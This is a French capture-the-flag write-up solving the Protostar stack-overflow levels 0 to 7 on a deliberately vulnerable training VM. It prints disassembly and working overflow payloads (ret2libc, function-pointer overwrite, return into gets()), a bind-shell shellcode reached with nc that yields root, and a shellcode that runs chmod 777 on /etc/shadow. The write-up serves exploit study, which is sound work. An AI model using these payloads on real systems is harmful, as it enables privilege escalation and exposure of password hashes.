# Solution du CTF Protostar (stack)

Le CTF [Protostar](https://vulnhub.com/entry/exploit-exercises-protostar-v2,32/) initialement provenant du site *exploit-exercices* est une série de challenges orientés spécifiquement vers l'exploitation de binaires.

Ici on va s'intéresser aux binaires stack consistant à exploiter des débordement de tampon sur la pile.

On ne dispose pas d'une image virtuelle OVA mais d'un ISO de live CD. Il faut donc créer une nouvelle VM depuis VirtualBox, indiquer que l'on ne veut pas créer de disque dur vituel (VDI) puis enfin rattacher sur le controlleur IDE l'image ISO.

Sur le type de système on peut sélectionner `Debian 6 32 bits`.

Pour se connecter à la VM il faut indiquer à SSH que l'on accepte les algos obsolètes, par exemple :

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa user@192.168.56.95
```

## Level 0

```nasm
int main (int argc, char **argv, char **envp);
; var char *s @ esp+0x1c
; var int32_t var_5ch @ esp+0x5c
0x080483f4      push ebp
0x080483f5      mov ebp, esp
0x080483f7      and esp, 0xfffffff0
0x080483fa      sub esp, 0x60
0x080483fd      mov dword [var_5ch], 0
0x08048405      lea eax, [s]
0x08048409      mov dword [esp], eax ; char *s
0x0804840c      call gets          ; sym.imp.gets ; char *gets(char *s)
0x08048411      mov eax, dword [var_5ch]
0x08048415      test eax, eax
0x08048417      je 0x8048427
0x08048419      mov dword [esp], str.you_have_changed_the__modified__variable ; 0x8048500 ; const char *s
0x08048420      call puts          ; sym.imp.puts ; int puts(const char *s)
0x08048425      jmp 0x8048433
0x08048427      mov dword [esp], str.Try_again ; 0x8048529 ; const char *s
0x0804842e      call puts          ; sym.imp.puts ; int puts(const char *s)
0x08048433      leave
```

Le CTF n'indique pas exactement s'il faut exploiter chaque binaire ou si certains servent uniquement à des fins de démo.

Par exemple celui çi indique si une variable initialisée à 0 (`var_5ch`) a été modifiée et donc si on l'a écrasé en saisissant une chaine trop longue sur l'entrée standard.

La particularité ici est que l'exploitation se fait directement dans la fonction `main()` ce qui est assez rare pour ce type de challenge.

Toutefois ça ne change pas grand chose car l'appel original s'est fait par un `call` :

```nasm
0x08048357      push main          ; 0x80483f4 ; void *main
0x0804835c      call __libc_start_main ; sym.imp.__libc_start_main ; int __libc_start_main(void *main, int argc, char **ubp_av, void *init, void *fini, void *rtld_fini, void *stack_end)
0x08048361      hlt
```

On voit ici que 0x60 (96) octets sont alloués pour la stack frame donc ce qui sépare `ebp` de `esp`. Mais notre buffer est à `esp+0x1c` (`esp+28`) donc il faut écraser à minima 96 - 28 = 68 octets pour remplir la stack frame avant d'attaquer le saved-ebp et l'adresse de retour.

On va commencer par passer au programme cette chaine suivante générée par Python :

```python
"A" * 68 + "BBBB" + "CCCC" + "DDDD" + "EEEE" + "FFFF"
```

```shellsession
$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
you have changed the 'modified' variable
Segmentation fault
$ dmesg|tail -1
[ 7528.902449] stack0[1800]: segfault at 45454545 ip 45454545 sp bffffd00 error 4
```

On voit que `eip` est écrasé par `45454545` soit les caractères E. Il faut donc 80 caractères avant d'écraser `eip`.

Note: j'ai trouvé cet article sur les codes d'erreurs segfault : [Chris's Wiki :: blog/linux/KernelSegfaultErrorCodes](https://utcc.utoronto.ca/~cks/space/blog/linux/KernelSegfaultErrorCodes)

On va utiliser la technique de `ret2libc` car la stack n'est pas randomisée : l'adresse de `system()` sera toujours au même emplacement.

Il faut aussi passer sur la stack le chemin du programme que l'on veut exécuter. Idéalement c'est `/bin/sh` mais la chaine n'est pas présente dans l'exécutable. On pourrait la retrouver dans la mémoire du programme une fois lancé puisqu'il charge la libc mais ici on va juste réutiliser une chaine du programme et s'arranger pour qu'il y ait un programme du nom correspondant dans le path.

```
$ gdb ./stack0
GNU gdb (GDB) 7.0.1-debian
Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) b *main
Breakpoint 1 at 0x80483f4: file stack0/stack0.c, line 6.
(gdb) r
Starting program: /opt/protostar/bin/stack0 

Breakpoint 1, main (argc=1, argv=0xbffffd64) at stack0/stack0.c:6
6       stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) x/s 0x08048520
0x8048520:       "variable"
```

Notre payload est constitué successivement de :

- un padding de 80 octets

- l'adresse de `system()` qui écrase l'adresse de retour

- un padding de 4 octets qui sera utilisé comme saved-eip à la sortie de la fonction `system()` (via son instruction `ret`)

- l'adresse de la chaine `variable` provenant du message `you have changed the 'modified' variable`

Exploitation :

```shellsession
$ cp /usr/bin/whoami /tmp/variable
$ export PATH=/tmp:$PATH
$ python -c 'import struct;print "A" * 80 + struct.pack("<I", 0xb7ecffb0) + "BBBB" + struct.pack("<I", 0x08048520)' | ./stack0
you have changed the 'modified' variable
root
Segmentation fault
$ dmesg|tail -1
[ 8476.152690] stack0[1829]: segfault at 42424242 ip 42424242 sp bffffd04 error 4
```

On voit que `whoami` a bien été exécuté (affiche `root`) et que après ça un segfault a eu lieu car le code a essayé de sauter ensuite sur l'adresse de padding correspondant à `BBBB`.

On aurait pu y écrire l'adresse de la fonction `exit()` pour éviter une entrée dans les logs :)

## Level 1

Ok je commence à comprendre l'idée du challenge et effectivement on était pas sensé aller jusqu'à l'exploitation XD

Ici on a donc une variable sur la stack qui se fit écraser et on doit faire en sorte qu'elle obtienne une certaine valeur :

```nasm
int main (int argc, char **argv, char **envp);
; arg char **argv @ ebp+0x8
; arg char **envp @ ebp+0xc
; var const char *src @ esp+0x4
; var char *dest @ esp+0x1c
; var int32_t var_5ch @ esp+0x5c
0x08048464      push    ebp
0x08048465      mov     ebp, esp
0x08048467      and     esp, 0xfffffff0
0x0804846a      sub     esp, 0x60
0x0804846d      cmp     dword [argv], 1
0x08048471      jne     0x8048487
0x08048473      mov     dword [src], str.please_specify_an_argument ; 0x80485a0
0x0804847b      mov     dword [esp], 1 ; int eval
0x08048482      call    errx       ; sym.imp.errx ; void errx(int eval)
0x08048487      mov     dword [var_5ch], 0
0x0804848f      mov     eax, dword [envp]
0x08048492      add     eax, 4
0x08048495      mov     eax, dword [eax]
0x08048497      mov     dword [src], eax ; const char *src
0x0804849b      lea     eax, [dest]
0x0804849f      mov     dword [esp], eax ; char *dest
0x080484a2      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x080484a7      mov     eax, dword [var_5ch]
0x080484ab      cmp     eax, 0x61626364
0x080484b0      jne     0x80484c0
0x080484b2      mov     dword [esp], str.you_have_correctly_got_the_variable_to_the_right_value ; 0x80485bc ; const char *s
0x080484b9      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x080484be      jmp     0x80484d5
0x080484c0      mov     edx, dword [var_5ch]
0x080484c4      mov     eax, str.Try_again__you_got_0x_08x ; 0x80485f3
0x080484c9      mov     dword [src], edx
0x080484cd      mov     dword [esp], eax ; const char *format
0x080484d0      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x080484d5      leave
0x080484d6      ret
```

On voit `0x61626364` donc `dcba` en raison de [l'endianness](https://fr.wikipedia.org/wiki/Boutisme). C'est facile d'y parvenir :

```shellsession
$ $ ./stack1 `python -c 'print "dcba" * 18'`
you have correctly got the variable to the right value
```

## Level 2

La leçon ici est qu'on ne pourra pas parvenir à tout en utilisant seulement bash. Le programme ici copie le contenu d'une variable d'environnement vers un buffer sur la stack.

```nasm
int main (int argc, char **argv, char **envp);
; var const char *src @ esp+0x4
; var char *dest @ esp+0x18
; var int32_t var_58h @ esp+0x58
; var char *var_5ch @ esp+0x5c
0x08048494      push    ebp
0x08048495      mov     ebp, esp
0x08048497      and     esp, 0xfffffff0
0x0804849a      sub     esp, 0x60
0x0804849d      mov     dword [esp], str.GREENIE ; 0x80485e0 ; const char *name
0x080484a4      call    getenv     ; sym.imp.getenv ; char *getenv(const char *name)
0x080484a9      mov     dword [var_5ch], eax
0x080484ad      cmp     dword [var_5ch], 0
0x080484b2      jne     0x80484c8
0x080484b4      mov     dword [src], str.please_set_the_GREENIE_environment_variable ; 0x80485e8
0x080484bc      mov     dword [esp], 1 ; int eval
0x080484c3      call    errx       ; sym.imp.errx ; void errx(int eval)
0x080484c8      mov     dword [var_58h], 0
0x080484d0      mov     eax, dword [var_5ch]
0x080484d4      mov     dword [src], eax ; const char *src
0x080484d8      lea     eax, [dest]
0x080484dc      mov     dword [esp], eax ; char *dest
0x080484df      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x080484e4      mov     eax, dword [var_58h]
0x080484e8      cmp     eax, 0xd0a0d0a
0x080484ed      jne     0x80484fd
0x080484ef      mov     dword [esp], str.you_have_correctly_modified_the_variable ; 0x8048618 ; const char *s
0x080484f6      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x080484fb      jmp     0x8048512
0x080484fd      mov     edx, dword [var_58h]
0x08048501      mov     eax, str.Try_again__you_got_0x_08x ; 0x8048641
0x08048506      mov     dword [src], edx
0x0804850a      mov     dword [esp], eax ; const char *format
0x0804850d      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x08048512      leave
0x08048513      ret
```

La valeur de l'entier écrasé comme précédemment sur la stack doit être `0xd0a0d0a` soit `\n\r\n\r` correspondant à des retours à la ligne.

Bash nous jette quand on peut définir la variable :

```shellsession
$ export GREENIE=`python -c 'print "\r\n\r\n" * 20'`
: bad variable name
```

Mais on peut le faire depuis Python :

```shellsession
$ $ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.environ["GREENIE"] = "\n\r\n\r" * 20
>>> os.system("./stack2")
you have correctly modified the variable
10496
```

## Level 3

Ici on a un exercice plus classique : la variable sur la stack correspond à un pointeur sur fonction initialisé à `null`.

Si ce pointeur n'est pas `null` la fonction pointée est appellée.

L'objectif est de faire appeller une fonction dans le programme baptisée `win()` :

```nasm
win ();
0x08048424      push    ebp
0x08048425      mov     ebp, esp
0x08048427      sub     esp, 0x18
0x0804842a      mov     dword [esp], str.code_flow_successfully_changed ; 0x8048540 ; const char *s
0x08048431      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x08048436      leave
0x08048437      ret
int main (int argc, char **argv, char **envp);
; var int32_t var_4h @ esp+0x4
; var char *s @ esp+0x1c
; var unsigned long var_5ch @ esp+0x5c
0x08048438      push    ebp
0x08048439      mov     ebp, esp
0x0804843b      and     esp, 0xfffffff0
0x0804843e      sub     esp, 0x60
0x08048441      mov     dword [var_5ch], 0
0x08048449      lea     eax, [s]
0x0804844d      mov     dword [esp], eax ; char *s
0x08048450      call    gets       ; sym.imp.gets ; char *gets(char *s)
0x08048455      cmp     dword [var_5ch], 0
0x0804845a      je      0x8048477
0x0804845c      mov     eax, str.calling_function_pointer__jumping_to_0x_08x ; 0x8048560
0x08048461      mov     edx, dword [var_5ch]
0x08048465      mov     dword [var_4h], edx
0x08048469      mov     dword [esp], eax ; const char *format
0x0804846c      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x08048471      mov     eax, dword [var_5ch]
0x08048475      call    eax
0x08048477      leave
```

Gotcha :

```shellsession
$ python -c 'print "\x24\x84\x04\x08"*20' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
Segmentation fault
```

## Level 4

On entre finalement sur un cas plus réaliste : ici pas de pointeur sur fonction, il faut écraser l'adresse de retour en débordant du tampon assigné au buffer.

```nasm
int main (int argc, char **argv, char **envp);
; var char *s @ esp+0x10
0x08048408      push    ebp
0x08048409      mov     ebp, esp
0x0804840b      and     esp, 0xfffffff0
0x0804840e      sub     esp, 0x50
0x08048411      lea     eax, [s]
0x08048415      mov     dword [esp], eax ; char *s
0x08048418      call    gets       ; sym.imp.gets ; char *gets(char *s)
0x0804841d      leave
0x0804841e      ret
0x0804841f      nop
```

On a toujours une fonction `win()` mais à l'adresse `0x080483f4`.

```shellsession
$ $ python -c 'print "\xf4\x83\x04\x08"*30' | ./stack4
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
Segmentation fault
```

On a dépassé les attentes en faisant exécuter la fonction plusieurs fois car étant utilisé à plusieurs reprises comme adresse de retour.

Ca montre un apperçu du ROP programming :)

## Level 5

On est dans un cas similaire au level 0 :

```shellsession
$ ./stack5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault
$ dmesg|tail -1
[11798.886479] stack5[1922]: segfault at 45454545 ip 45454545 sp bffffcf0 error 4
```

Au lieu de simplement zapper ce level voici un cas d'exploitation locale à l'ancienne.

J'écris d'abord le code suivant qui permet d'avoir l'adresse d'une variable d'environnement telle que chargée en mémoire (c'est le linker commun à tous les programmes qui se charge de les mettre dans la mémoire du programme) :

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
        printf("%s is at %p\n", argv[1], getenv(argv[1]));
        return 0;
}
```

On va affichier l'adresse de la variable d'environnement GREENIE utilisée plus tôt :

```shellsession
$ $ ./getaddr GREENIE
GREENIE is at 0xbfffff2c
$ ./getaddr GREENIE
GREENIE is at 0xbfffff2c
$ export A=B
$ ./getaddr GREENIE
GREENIE is at 0xbfffff28
```

On voit que l'adresse est assez stable mais sujette aux décalages si l'environnement évolue. Le nom du programme lancé fait aussi partie des données qui peuvent causer un décalage.

Maintenant je créé un nouvelle variable d'environnement qui contient un shellcode précédé d'un NOPsled :

```shellsession
$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
```

Il s'agit de [Linux/x86 - Bind (User Specified Port) Shell (/bin/sh) Shellcode (102 bytes)](https://www.exploit-db.com/shellcodes/50124) qui écoute par défaut sur le port 4444.

J'écrase l'adresse de retour par l'adresse du shellcode telle qu'elle devrait être en mémoire :

```shellsession
$ /tmp/getaddr SHELLCODE
SHELLCODE is at 0xbffffec0
$ python -c 'print "z"*76 + "\xc0\xfe\xff\xbf"' | ./stack5
```

Le programme semble alors gelé, c'est juste qu'il attend une connexion qu'on lui donne :

```shellsession
$ nc 127.0.0.1 4444 -v
127.0.0.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [127.0.0.1] 4444 (?) open
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## Level 6

On a un cas qui ressemble aux précédents :

```shellsession
$ python -c 'print "A"*80 + "BBBB"'  | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
Segmentation fault
$ dmesg | tail -1
[44970.395686] stack6[2477]: segfault at 42424242 ip 42424242 sp bffffbc0 error 4
```

Mais en apparence seulement. La fonction `main` ne fait que appeller `getpath` que voici :

```nasm
getpath (int32_t arg_4h);
; var char *s @ ebp-0x4c
; var int32_t var_ch @ ebp-0xc
; arg int32_t arg_4h @ ebp+0x4
; var int32_t var_4h @ esp+0x4
0x08048484      push    ebp
0x08048485      mov     ebp, esp
0x08048487      sub     esp, 0x68
0x0804848a      mov     eax, str.input_path_please: ; 0x80485d0
0x0804848f      mov     dword [esp], eax ; const char *format
0x08048492      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x08048497      mov     eax, dword [stdout] ; obj.stdout__GLIBC_2.0
                                   ; 0x8049720
0x0804849c      mov     dword [esp], eax ; FILE *stream
0x0804849f      call    fflush     ; sym.imp.fflush ; int fflush(FILE *stream)
0x080484a4      lea     eax, [s]
0x080484a7      mov     dword [esp], eax ; char *s
0x080484aa      call    gets       ; sym.imp.gets ; char *gets(char *s)
0x080484af      mov     eax, dword [arg_4h]
0x080484b2      mov     dword [var_ch], eax
0x080484b5      mov     eax, dword [var_ch]
0x080484b8      and     eax, 0xbf000000
0x080484bd      cmp     eax, 0xbf000000
0x080484c2      jne     0x80484e4
0x080484c4      mov     eax, str.bzzzt___p ; 0x80485e4
0x080484c9      mov     edx, dword [var_ch]
0x080484cc      mov     dword [var_4h], edx
0x080484d0      mov     dword [esp], eax ; const char *format
0x080484d3      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x080484d8      mov     dword [esp], 1 ; int status
0x080484df      call    _exit      ; sym.imp._exit ; void _exit(int status)
0x080484e4      mov     eax, str.got_path__s ; 0x80485f0
0x080484e9      lea     edx, [s]
0x080484ec      mov     dword [var_4h], edx
0x080484f0      mov     dword [esp], eax ; const char *format
0x080484f3      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x080484f8      leave
0x080484f9      ret
```

Mais surtout si on tente d'écraser l'adresse de retour par une adresse de la stack (du type `0xbfXXXXXX`) alors le programme le détecte (voir instruction à `0x080484bd`) et appelle `exit()` :

```shellsession
$ python -c 'print "A"*80 + "\x01\x01\x01\xbf"' | ./stack6
input path please: bzzzt (0xbf010101)
```

Un `ret2libc` pourrait fonctionner mais ici au lieu de passer l'adresse de `system()` on va appeller à nouveau la fonction `gets()` pour quelle lise notre shellcode vers une adresse que l'on controle (mais pas sur la stack) puis saute dessus.

Si on lance le programme on peut (par exemple pendant qu'il attend des données) aller voir sa structure en mémoire via le fichier `maps` sous son pid dans `/proc` :

```shellsession
$ cat /proc/2385/maps
08048000-08049000 r-xp 00000000 00:10 4963       /opt/protostar/bin/stack6
08049000-0804a000 rwxp 00000000 00:10 4963       /opt/protostar/bin/stack6
b7e96000-b7e97000 rwxp 00000000 00:00 0 
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rwxp 00000000 00:00 0 
b7fe0000-b7fe2000 rwxp 00000000 00:00 0 
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
```

On voit que la seconde plage d'adresse (qui commence à `0x08049000`) est écrivable et exécutable. Normalement c'est une section pour des variables mais on va mettre notre shellcode dedans.

Il nous faut déjà l'adresse de `gets` :

```shellsession
$ objdump -d stack6 | grep gets
08048380 <gets@plt>:
 80484aa:       e8 d1 fe ff ff          call   8048380 <gets@plt>
```

Et ensuite on va passer l'adresse `0x08049004` histoire de ne pas avoir d'octet nul. On la passe plusieurs fois car il y a l'argument pour `gets`, du padding ainsi que l'adresse de retour suivante pour sauter sur le shellcode :

```shellsession
$ python -c 'print "A"*80 + "\x80\x83\x04\x08" + "\x04\x90\x04\x08" * 3; print "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
```

Le programme freeze car le shellcode est le même que précédemment et écoute sur le port 4444 :

```shellsession
$ nc 127.0.0.1 4444 -v
127.0.0.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [127.0.0.1] 4444 (?) open
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## Level 7

On reste quasiment dans la même configuration sauf qu'en plus ici un `strdup()` est appelé sur notre input ce qui a pour effet de copier la chaine à un emplacement dans le heap.

Comme rien n'est exécuté après le `strdup()` cela signifie que `eax` contiendra l'adresse du buffer copié (car `eax` sert de valeur de retour en assembleur).

```nasm
getpath (int32_t arg_4h);
; var char *src @ ebp-0x4c
; var int32_t var_ch @ ebp-0xc
; arg int32_t arg_4h @ ebp+0x4
; var int32_t var_4h @ esp+0x4
0x080484c4      push ebp
0x080484c5      mov ebp, esp
0x080484c7      sub esp, 0x68
0x080484ca      mov eax, str.input_path_please: ; 0x8048620
0x080484cf      mov dword [esp], eax ; const char *format
0x080484d2      call printf        ; sym.imp.printf ; int printf(const char *format)
0x080484d7      mov eax, dword [stdout] ; obj.stdout__GLIBC_2.0
                                   ; 0x8049780
0x080484dc      mov dword [esp], eax ; FILE *stream
0x080484df      call fflush        ; sym.imp.fflush ; int fflush(FILE *stream)
0x080484e4      lea eax, [src]
0x080484e7      mov dword [esp], eax ; char *s
0x080484ea      call gets          ; sym.imp.gets ; char *gets(char *s)
0x080484ef      mov eax, dword [arg_4h]
0x080484f2      mov dword [var_ch], eax
0x080484f5      mov eax, dword [var_ch]
0x080484f8      and eax, 0xb0000000
0x080484fd      cmp eax, 0xb0000000
0x08048502      jne 0x8048524
0x08048504      mov eax, str.bzzzt___p ; 0x8048634
0x08048509      mov edx, dword [var_ch]
0x0804850c      mov dword [var_4h], edx
0x08048510      mov dword [esp], eax ; const char *format
0x08048513      call printf        ; sym.imp.printf ; int printf(const char *format)
0x08048518      mov dword [esp], 1 ; int status
0x0804851f      call _exit         ; sym.imp._exit ; void _exit(int status)
0x08048524      mov eax, str.got_path__s ; 0x8048640
0x08048529      lea edx, [src]
0x0804852c      mov dword [var_4h], edx
0x08048530      mov dword [esp], eax ; const char *format
0x08048533      call printf        ; sym.imp.printf ; int printf(const char *format)
0x08048538      lea eax, [src]
0x0804853b      mov dword [esp], eax ; const char *src
0x0804853e      call strdup        ; sym.imp.strdup ; char *strdup(const char *src)
0x08048543      leave
0x08048544      ret
```

Avec ROPgadget on trouve facilement un gadget utile pour sauter sur l'adresse pointée :

```nasm
0x080484bf : call eax
```

Seulement à cause de cet appel supplémentaire la pile est aussi modifiée ce qui signifie que des instructions invalides peuvent être placées au milieu de notre shellcode.

Il apparait ici que la modification est plutôt faite vers la fin donc on va éviter d'utiliser un nopsled (dont on n'a pas besoin ici) et plutôt mettre le shellcode en tête suivi de padding 'qui pourra être écrasé sans problèmes).

On va aussi avoir recours à un shellcode court comme [Linux/x86 - chmod 777 /etc/shadow + exit() Shellcode (33 bytes)](https://www.exploit-db.com/shellcodes/37285) :

```shellsession
$ python -c 'print "\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\xb0\x0f\x89\xe3\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*47 +"\xbf\x84\x04\x08"' | ./stack7
input path please: got path 1�Phadowhc/shh//et���f��̀1�@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
$ ls -al /etc/shadow
-rwxrwxrwx 1 root shadow 938 Nov 24  2011 /etc/shadow
```

C'est terminé pour ces exercices concernant la stack :-)

EDIT: Il y a apparemment ce site qui reprend le projet de manière assez officielle : [Protostar :: Andrew Griffiths' Exploit Education](https://exploit.education/protostar/)

*Publié le 5 janvier 2023*
